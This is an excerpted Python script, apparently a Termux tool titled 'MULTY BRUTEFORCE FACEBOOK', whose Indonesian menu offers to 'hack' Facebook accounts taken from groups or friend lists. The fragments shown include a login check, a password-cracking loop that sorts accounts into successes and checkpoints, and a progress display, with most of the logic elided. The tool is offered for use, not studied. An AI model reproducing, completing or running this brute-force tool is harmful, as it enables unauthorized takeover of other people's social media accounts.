...
def login():
    ...
    if 'save-device' in url or 'm_sess' in url:
        ...
        tampil('\rh[*]Selamat datang \rk%s\n\rh[*]Apabila bingung, Silahkan kunjungi saja web http://termux.id atau chat ke wa +6282278198738....' % nama)
        log = 1
...
def idgroup():
    if log != 1:
        tampil('\rh[*]Login ke akun fb kalian...')
        login()
        if log == 0:
            keluar()
...
def crack0(data, sandi, p):
    ...
    print('\x1b[32;1m[*]Cracking \x1b[31;1m[\x1b[36;1m0%\x1b[31;1m]\x1b[0m', end='')
    os.sys.stdout.flush()
    akun_jml = []
    akun_sukses = []
    akun_cekpoint = []
        ...
        try:
            for i in th:
                ...
                if a[0] != 3 and a[1] not in akun_jml:
                    ...
                    print('\r\x1b[32;1m[*]Cracking \x1b[31;1m[\x1b[36;1m%0.2f%s\x1b[31;1m]\x1b[0m' % (float(float(jml0) / float(jml1) * 100), '%'), end='')
                    os.sys.stdout.flush()
                    akun_jml.append(a[1])
    ...
    print('\r\x1b[32;1m[*]Cracking \x1b[31;1m[\x1b[36;1m100%\x1b[31;1m]\x1b[0m     ')
...
def menu():
    tampil('\rh\n                     \n\rk###########################################################\n#             \rb*MULTY BRUTEFORCE FACEBOOK*\rk                 #\n# \rhBY\rp       : AyipBontos                                   \rk#\n# \rhSuport\rp   : Kunjungi Website Kami                        \rk#\n# \rhWebsite\rp  : http://Termux.id                             \rk#\n#       \rmTutorial dan Script Termux Lengkap                \rk#\n###########################################################')
    tampil('\rk%s\n\rc1 \rhHack akun Facebook dari group\n\rc2 \rhHack akun Facebook daftar teman\n\rc3 \rmKELUAR\n\rk%s' % ('####################', '####################'))
